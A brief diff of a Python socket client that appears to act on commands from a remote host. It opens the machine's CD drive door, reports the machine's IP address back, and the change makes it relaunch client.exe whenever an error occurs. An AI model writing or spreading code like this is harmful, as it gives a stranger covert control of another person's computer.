@@ -28,9 +28,11 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
                 s.sendall(bytes(f"recieved Q {ip_address}","utf-8"))
             elif (data == b"S"):
-                os.startfile("client.exe")
-                sys.exit()
+                pass
+                #os.startfile("client.exe")
+                #sys.exit()
         except:
+            os.startfile("client.exe")
             sys.exit()
 
     
